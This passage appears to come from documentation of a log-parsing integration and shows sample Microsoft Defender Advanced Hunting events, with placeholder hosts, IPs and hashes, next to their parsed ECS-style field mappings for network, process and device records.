        "agent": {
            "id": "111111111111111111111111111111111111111"
        },
        "destination": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "port": 443
        },
        "host": {
            "id": "111111111111111111111111111111111111111",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "106822"
                }
            }
        },
        "network": {
            "protocol": "TcpV4"
        },
        "process": {
            "args": [
                "--field-trial-handle=2408,i,10825731403441479940,17898034617995043179,262144",
                "--lang=en-GB",
                "--metrics-shmem-handle=2560,i,7182567781150524342,1134727304477683424,524288",
                "--mojo-platform-channel-handle=2568",
                "--no-pre-read-main-dll",
                "--service-sandbox-type=none",
                "--type=utility",
                "--utility-sub-type=network.mojom.NetworkService",
                "--variations-seed-version=20250826-180048.703000",
                "/prefetch:3"
            ],
            "command_line": "\"chrome.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --no-pre-read-main-dll --metrics-shmem-handle=2560,i,7182567781150524342,1134727304477683424,524288 --field-trial-handle=2408,i,10825731403441479940,17898034617995043179,262144 --variations-seed-version=20250826-180048.703000 --mojo-platform-channel-handle=2568 /prefetch:3",
            "executable": "c:\\program files\\google\\chrome\\application\\chrome.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "chrome.exe",
            "parent": {
                "name": "chrome.exe",
                "pid": 23948,
                "start": "2025-08-27T08:14:11.271745Z"
            },
            "pid": 31404,
            "start": "2025-08-27T08:14:14.492820Z",
            "user": {
                "domain": "example.com",
                "email": "ANONYMIZED",
                "id": "S-1-2-3-4",
                "name": "user1"
            },
            "working_directory": "c:\\program files\\google\\chrome\\application"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2",
            "port": 52468
        },
        "url": {
            "domain": "example.com",
            "full": "https://example.com/",
            "original": "https://example.com/",
            "path": "/",
            "port": 443,
            "registered_domain": "example.com",
            "scheme": "https",
            "top_level_domain": "com"
        }
    }
    	
	```


=== "test_device_network_info.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-01-04T14:07:34.1999095Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkInfo\",\"properties\":{\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"DeviceName\":\"example.com\",\"Timestamp\":\"2023-01-04T14:04:35.622431Z\",\"ReportId\":13489,\"NetworkAdapterName\":\"{22222222-2222-2222-2222-222222222222}\",\"NetworkAdapterType\":\"Guest\",\"NetworkAdapterStatus\":\"Down\",\"TunnelType\":\"None\",\"ConnectedNetworks\":null,\"DnsAddresses\":\"[\\\"fff0:0:0:ffff::1\\\",\\\"fff0:0:0:ffff::2\\\",\\\"fff0:0:0:ffff::3\\\"]\",\"DefaultGateways\":null,\"MacAddress\":\"02:00:00:00:00:00\",\"IPv4Dhcp\":\"\",\"IPv6Dhcp\":\"\",\"IPAddresses\":\"[{\\\"IPAddress\\\":\\\"1.1.1.1\\\",\\\"SubnetPrefix\\\":16,\\\"AddressType\\\":\\\"LinkLocal\\\"},{\\\"IPAddress\\\":\\\"ffff::fff:fff:aaa:ccc\\\",\\\"SubnetPrefix\\\":64,\\\"AddressType\\\":\\\"Private\\\"}]\",\"NetworkAdapterVendor\":null,\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_network_info",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-01-04T14:04:35.622431Z",
        "action": {
            "name": "Publish"
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940"
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "mac": [
                "02:00:00:00:00:00"
            ],
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "observer": {
                    "interface": {
                        "dns": [
                            "fff0:0:0:ffff::1",
                            "fff0:0:0:ffff::2",
                            "fff0:0:0:ffff::3"
                        ],
                        "ips": [
                            "{\"AddressType\":\"LinkLocal\",\"IPAddress\":\"1.1.1.1\",\"SubnetPrefix\":16}",
                            "{\"AddressType\":\"Private\",\"IPAddress\":\"ffff::fff:fff:aaa:ccc\",\"SubnetPrefix\":64}"
                        ],
                        "name": "{22222222-2222-2222-2222-222222222222}",
                        "status": "Down",
                        "type": "Guest"
                    }
                },
                "report": {
                    "id": "13489"
                }
            }
        }
    }
    	
	```


=== "test_device_network_info_1.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-07-31T06:27:40.4050787Z\",\"tenantId\":\"test-tenant-id\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkInfo\",\"_TimeReceivedBySvc\":\"2025-07-31T06:22:42.7250684Z\",\"properties\":{\"DeviceId\":\"testdeviceid-0000000000000\",\"DeviceName\":\"example.com\",\"ReportId\":123123123,\"NetworkAdapterName\":null,\"NetworkAdapterType\":null,\"NetworkAdapterStatus\":\"Unknown\",\"TunnelType\":\"None\",\"ConnectedNetworks\":\"[{\\\"Name\\\":\\\"test-test.com\\\",\\\"Description\\\":\\\"test-test.com\\\",\\\"IsConnectedToInternet\\\":null,\\\"Category\\\":null}]\",\"DnsAddresses\":null,\"DefaultGateways\":\"[null]\",\"MacAddress\":\"02:00:00:00:00:00\",\"IPv4Dhcp\":null,\"IPv6Dhcp\":null,\"IPAddresses\":\"[{\\\"IPAddress\\\":\\\"1.1.1.1.5\\\",\\\"SubnetPrefix\\\":null,\\\"AddressType\\\":\\\"Private\\\"}]\",\"NetworkAdapterVendor\":\"ALE International\",\"Timestamp\":\"2025-07-31T06:18:21.5134231Z\",\"MachineGroup\":\"UnassignedGroup\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_network_info",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-07-31T06:18:21.513423Z",
        "action": {
            "name": "Publish"
        },
        "agent": {
            "id": "testdeviceid-0000000000000"
        },
        "host": {
            "id": "testdeviceid-0000000000000",
            "mac": [
                "02:00:00:00:00:00"
            ],
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "observer": {
                    "interface": {
                        "gateways": "[null]",
                        "ips": "[{\"IPAddress\":\"1.1.1.1.5\",\"SubnetPrefix\":null,\"AddressType\":\"Private\"}]",
                        "networks": "[{\"Name\":\"test-test.com\",\"Description\":\"test-test.com\",\"IsConnectedToInternet\":null,\"Category\":null}]",
                        "status": "Unknown"
                    }
                },
                "report": {
                    "id": "123123123"
                }
            }
        }
    }
    	
	```


=== "test_device_process_created.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-08-01T18:30:14.6841985Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2024-08-01T18:28:43.4289906Z\",\"properties\":{\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"DeviceName\":\"desktop01.example.org\",\"ReportId\":4772,\"InitiatingProcessId\":null,\"InitiatingProcessCreationTime\":null,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessParentId\":null,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":\"{\\\"InitiatingProcess\\\":{},\\\"ClientMachine\\\":\\\"l-195hnx3\\\",\\\"IsRemoteMachine\\\":false}\",\"InitiatingProcessAccountSid\":null,\"AppGuardContainerId\":\"\",\"InitiatingProcessSHA256\":null,\"SHA256\":null,\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"ProcessCreatedUsingWmiQuery\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":null,\"AccountSid\":null,\"RemoteDeviceName\":\"\",\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"FileSize\":null,\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-08-01T18:27:07.2126839Z\",\"MachineGroup\":null},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-08-01T18:27:07.212683Z",
        "action": {
            "name": "Publish",
            "properties": {
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "ProcessCreatedUsingWmiQuery"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "desktop01.example.org"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "4772"
                }
            }
        },
        "process": {
            "user": {
                "domain": "example.com",
                "name": "user1"
            }
        }
    }
    	
	```


=== "test_device_process_events.json"

    ```json
	
    {
        "message": "{\"time\":\"2023-01-04T14:16:55.5041166Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceProcessEvents\",\"properties\":{\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessFileSize\":133576,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"MsMpEng.exe\",\"InitiatingProcessParentFileName\":\"services.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\programdata\\\\microsoft\\\\windows defender\\\\platform\\\\4.18.2301.6-0\\\\msmpeng.exe\",\"InitiatingProcessCommandLine\":\"\\\"MsMpEng.exe\\\"\",\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"FileSize\":1592184,\"MD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"FolderPath\":\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.2301.6-0\\\\MpCmdRun.exe\",\"ProcessCommandLine\":\"\\\"MpCmdRun.exe\\\" Scan -ScheduleJob -RestrictPrivileges -DailyScan -ScanTrigger 54\",\"FileName\":\"MpCmdRun.exe\",\"ProcessId\":37788,\"InitiatingProcessId\":5456,\"ProcessCreationTime\":\"2023-01-04T14:15:10.3550336Z\",\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"DeviceName\":\"example.com\",\"InitiatingProcessCreationTime\":\"2023-01-03T08:51:29.2692792Z\",\"InitiatingProcessAccountName\":\"System\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessSignatureStatus\":\"Valid\",\"InitiatingProcessSignerType\":\"OsVendor\",\"InitiatingProcessParentId\":1032,\"ReportId\":104118,\"Timestamp\":\"2023-01-04T14:15:10.4684522Z\",\"InitiatingProcessParentCreationTime\":\"2023-01-03T08:51:26.7402415Z\",\"InitiatingProcessTokenElevation\":\"TokenElevationTypeDefault\",\"InitiatingProcessIntegrityLevel\":\"System\",\"AccountDomain\":\"example.com\",\"AccountName\":\"system\",\"ProcessTokenElevation\":\"TokenElevationTypeDefault\",\"ProcessIntegrityLevel\":\"System\",\"AccountSid\":\"user1\",\"AppGuardContainerId\":\"\",\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessLogonId\":999,\"LogonId\":999,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AccountUpn\":null,\"AccountObjectId\":null,\"AdditionalFields\":null,\"InitiatingProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Microsoft\\u00ae Windows\\u00ae Operating System\",\"InitiatingProcessVersionInfoProductVersion\":\"4.18.2301.6\",\"InitiatingProcessVersionInfoInternalFileName\":\"MsMpEng.exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"MsMpEng.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Antimalware Service Executable\",\"ProcessVersionInfoCompanyName\":\"Microsoft Corporation\",\"ProcessVersionInfoProductName\":\"Microsoft\\u00ae Windows\\u00ae Operating System\",\"ProcessVersionInfoProductVersion\":\"4.18.2301.6\",\"ProcessVersionInfoInternalFileName\":\"MpCmdRun\",\"ProcessVersionInfoOriginalFileName\":\"MpCmdRun.exe\",\"ProcessVersionInfoFileDescription\":\"Microsoft Malware Protection Command Line Utility\",\"InitiatingProcessUniqueId\":\"151715012447044204\",\"MachineGroup\":\"UnassignedGroup\",\"ActionType\":\"ProcessCreated\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "device_process_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-01-04T14:15:10.468452Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "user1",
                "InitiatingProcessCommandLine": "\"MsMpEng.exe\"",
                "InitiatingProcessFileSize": 133576,
                "InitiatingProcessIntegrityLevel": "System",
                "InitiatingProcessLogonId": "999",
                "InitiatingProcessParentFileName": "services.exe",
                "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
                "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Antimalware Service Executable",
                "InitiatingProcessVersionInfoInternalFileName": "MsMpEng.exe",
                "InitiatingProcessVersionInfoOriginalFileName": "MsMpEng.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
                "InitiatingProcessVersionInfoProductVersion": "4.18.2301.6",
                "LogonId": "999",
                "ProcessIntegrityLevel": "System",
                "ProcessTokenElevation": "TokenElevationTypeDefault",
                "ProcessVersionInfoCompanyName": "Microsoft Corporation",
                "ProcessVersionInfoFileDescription": "Microsoft Malware Protection Command Line Utility",
                "ProcessVersionInfoInternalFileName": "MpCmdRun",
                "ProcessVersionInfoOriginalFileName": "MpCmdRun.exe",
                "ProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
                "ProcessVersionInfoProductVersion": "4.18.2301.6"
            },
            "type": "ProcessCreated"
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940"
        },
        "file": {
            "directory": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2301.6-0\\MpCmdRun.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "MpCmdRun.exe",
            "size": 1592184
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "example.com",
            "os": {
                "type": "windows"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104118"
                }
            }
        },
        "process": {
            "args": [
                "-DailyScan",
                "-RestrictPrivileges",
                "-ScanTrigger",
                "-ScheduleJob",
                "54",
                "Scan"
            ],
            "command_line": "\"MpCmdRun.exe\" Scan -ScheduleJob -RestrictPrivileges -DailyScan -ScanTrigger 54",
            "executable": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2301.6-0\\MpCmdRun.exe",
            "name": "MpCmdRun.exe",
            "parent": {
                "code_signature": {
                    "status": "Valid",
                    "subject_name": "OsVendor"
                },
                "command_line": "\"MsMpEng.exe\"",
                "executable": "c:\\programdata\\microsoft\\windows defender\\platform\\4.18.2301.6-0\\msmpeng.exe",
                "hash": {
                    "md5": "68b329da9893e34099c7d8ad5cb9c940",
                    "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                    "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
                },
                "name": "MsMpEng.exe",
                "pid": 5456,
                "start": "2023-01-03T08:51:29.269279Z",
                "user": {
                    "domain": "example.com",
                    "id": "user1",
                    "name": "System"
                },
                "working_directory": "c:\\programdata\\microsoft\\windows defender\\platform\\4.18.2301.6-0"
            },
            "pid": 37788,
            "start": "2023-01-04T14:15:10.355033Z",
            "working_directory": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2301.6-0"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "user": [
                "system"
            ]
        },
        "user": {
            "domain": "example.com",
            "name": "system"
        }
    }
    	
	```


=== "test_device_process_events_2.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-22T15:10:39.1954172Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceProcessEvents\",\"_TimeReceivedBySvc\":\"2024-10-22T15:10:13.8421815Z\",\"properties\":{\"InitiatingProcessSHA1\":null,\"InitiatingProcessFileSize\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFileName\":\"\",\"InitiatingProcessParentFileName\":\"\",\"InitiatingProcessFolderPath\":null,\"InitiatingProcessCommandLine\":\"\",\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"FileSize\":144632,\"MD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"FolderPath\":\"/usr/bin/ps\",\"ProcessCommandLine\":\"/bin/ps -A -o comm,pid,pcpu,pmem,rss,etimes --no-headers\",\"FileName\":\"ps\",\"ProcessId\":423627,\"InitiatingProcessId\":423627,\"ProcessCreationTime\":\"2024-10-22T15:09:44.594155Z\",\"DeviceName\":\"example.com\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessCreationTime\":\"2024-10-22T15:09:44.59Z\",\"InitiatingProcessAccountName\":\"root\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":null,\"InitiatingProcessSignatureStatus\":\"Unknown\",\"InitiatingProcessSignerType\":\"Unknown\",\"InitiatingProcessParentId\":0,\"ReportId\":67417,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessTokenElevation\":\"None\",\"InitiatingProcessIntegrityLevel\":null,\"AccountDomain\":\"example.com\",\"AccountName\":\"root\",\"ProcessTokenElevation\":\"None\",\"ProcessIntegrityLevel\":null,\"AccountSid\":null,\"AppGuardContainerId\":null,\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA256\":null,\"InitiatingProcessLogonId\":0,\"LogonId\":0,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AccountUpn\":null,\"AccountObjectId\":null,\"AdditionalFields\":\"{\\\"InitiatingProcessPosixEffectiveUser\\\":{\\\"Name\\\":\\\"root\\\",\\\"DomainName\\\":\\\"computer\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"mdatp\\\",\\\"PosixGroupId\\\":591}},\\\"InitiatingProcessPosixEffectiveGroup\\\":{\\\"Name\\\":\\\"mdatp\\\",\\\"PosixGroupId\\\":591},\\\"InitiatingProcessPosixProcessGroupId\\\":423627,\\\"InitiatingProcessPosixSessionId\\\":180264,\\\"InitiatingProcessCurrentWorkingDirectory\\\":\\\"/opt/microsoft/mdatp/sbin\\\",\\\"InitiatingProcessPosixRealUser\\\":{\\\"Name\\\":\\\"root\\\",\\\"DomainName\\\":\\\"computer\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"mdatp\\\",\\\"PosixGroupId\\\":591}},\\\"ProcessPosixEffectiveUser\\\":{\\\"Name\\\":\\\"root\\\",\\\"DomainName\\\":\\\"computer\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"mdatp\\\",\\\"PosixGroupId\\\":591}},\\\"ProcessPosixEffectiveGroup\\\":{\\\"Name\\\":\\\"mdatp\\\",\\\"PosixGroupId\\\":591},\\\"ProcessPosixProcessGroupId\\\":423627,\\\"ProcessPosixSessionId\\\":180264,\\\"ProcessCurrentWorkingDirectory\\\":\\\"/opt/microsoft/mdatp/sbin\\\",\\\"ProcessPosixFilePermissions\\\":[\\\"OthersExecute\\\",\\\"OthersRead\\\",\\\"GroupExecute\\\",\\\"GroupRead\\\",\\\"UserExecute\\\",\\\"UserWrite\\\",\\\"UserRead\\\",\\\"UserAll\\\"],\\\"ProcessPosixFileUserOwner\\\":{\\\"Name\\\":\\\"root\\\",\\\"DomainName\\\":\\\"computer\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"mdatp\\\",\\\"PosixGroupId\\\":591}},\\\"ProcessPosixFileGroupOwner\\\":{\\\"Name\\\":\\\"root\\\",\\\"PosixGroupId\\\":0}}\",\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"ProcessVersionInfoCompanyName\":null,\"ProcessVersionInfoProductName\":null,\"ProcessVersionInfoProductVersion\":null,\"ProcessVersionInfoInternalFileName\":null,\"ProcessVersionInfoOriginalFileName\":null,\"ProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"CreatedProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"ActionType\":\"ProcessCreated\",\"Timestamp\":\"2024-10-22T15:09:44.594155Z\",\"MachineGroup\":\"Linux Servers - remediate threats automatically\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "device_process_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-22T15:09:44.594155Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessLogonId": "0",
                "IsInitiatingProcessRemoteSession": "false",
                "LogonId": "0"
            },
            "type": "ProcessCreated"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "file": {
            "directory": "/usr/bin/ps",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "ps",
            "size": 144632
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com",
            "os": {
                "type": "linux"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "67417"
                }
            }
        },
        "process": {
            "args": [
                "--no-headers",
                "-A",
                "-o",
                "comm,pid,pcpu,pmem,rss,etimes"
            ],
            "command_line": "/bin/ps -A -o comm,pid,pcpu,pmem,rss,etimes --no-headers",
            "executable": "/usr/bin/ps",
            "name": "ps",
            "parent": {
                "code_signature": {
                    "status": "Unknown",
                    "subject_name": "Unknown"
                },
                "pid": 423627,
                "start": "2024-10-22T15:09:44.590000Z",
                "user": {
                    "domain": "example.com",
                    "name": "root"
                }
            },
            "pid": 423627,
            "start": "2024-10-22T15:09:44.594155Z",
            "working_directory": "/usr/bin"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "user": [
                "root"
            ]
        },
        "user": {
            "domain": "example.com",
            "name": "root"
        }
    }
    	
	```


=== "test_device_process_events_macos.json"

    ```json
	
    {
        "message": "{\"time\":\"2025-06-23T17:42:05.1039395Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceProcessEvents\",\"_TimeReceivedBySvc\":\"2025-06-23T17:41:40.1175867Z\",\"properties\":{\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessFileSize\":216320,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"xpcproxy\",\"InitiatingProcessParentFileName\":\"launchd\",\"InitiatingProcessFolderPath\":\"/usr/libexec/xpcproxy\",\"InitiatingProcessCommandLine\":\"xpcproxy com.apple.systemsettingsagent\",\"SHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"FileSize\":618128,\"MD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"FolderPath\":\"/System/Applications/System Settings.app/Contents/Resources/systemsettingsagent\",\"ProcessCommandLine\":\"\\\"/System/Applications/System Settings.app/Contents/Resources/systemsettingsagent\\\"\",\"FileName\":\"systemsettingsagent\",\"ProcessId\":7357,\"InitiatingProcessId\":7357,\"ProcessCreationTime\":\"2025-06-23T17:41:30.835162Z\",\"DeviceName\":\"example.com\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessCreationTime\":\"2025-06-23T17:41:30.835132Z\",\"InitiatingProcessAccountName\":\"root\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountSid\":\"S-1-5-18\",\"InitiatingProcessSignatureStatus\":\"Unknown\",\"InitiatingProcessSignerType\":\"Unknown\",\"InitiatingProcessParentId\":7357,\"ReportId\":10673,\"InitiatingProcessParentCreationTime\":\"2025-06-23T17:41:30.804024Z\",\"InitiatingProcessTokenElevation\":\"None\",\"InitiatingProcessIntegrityLevel\":null,\"AccountDomain\":\"example.com\",\"AccountName\":\"user1\",\"ProcessTokenElevation\":\"None\",\"ProcessIntegrityLevel\":null,\"AccountSid\":\"S-1-5-21-1111111111-2222222222-3333333333-2004\",\"AppGuardContainerId\":null,\"SHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessLogonId\":0,\"LogonId\":0,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AccountUpn\":null,\"AccountObjectId\":null,\"AdditionalFields\":\"{\\\"InitiatingProcessPosixEffectiveUser\\\":{\\\"Sid\\\":\\\"S-1-5-18\\\",\\\"Name\\\":\\\"root\\\",\\\"DomainName\\\":\\\"MAC-EXAMPLE\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"wheel\\\",\\\"PosixGroupId\\\":0}},\\\"InitiatingProcessPosixEffectiveGroup\\\":{\\\"Name\\\":\\\"wheel\\\",\\\"PosixGroupId\\\":0},\\\"InitiatingProcessPosixProcessGroupId\\\":1,\\\"InitiatingProcessPosixSessionId\\\":1,\\\"InitiatingProcessCurrentWorkingDirectory\\\":\\\"/\\\",\\\"InitiatingProcessPosixFilePermissions\\\":[\\\"None\\\"],\\\"InitiatingProcessPosixRealUser\\\":{\\\"Sid\\\":\\\"S-1-5-18\\\",\\\"Name\\\":\\\"root\\\",\\\"DomainName\\\":\\\"MAC-EXAMPLE\\\",\\\"LogonId\\\":0,\\\"PosixUserId\\\":0,\\\"PrimaryPosixGroup\\\":{\\\"Name\\\":\\\"wheel\\\",\\\"PosixGroupId\\\":0}},\\\"ProcessPosixEffectiveUser\\\":{\\\"Si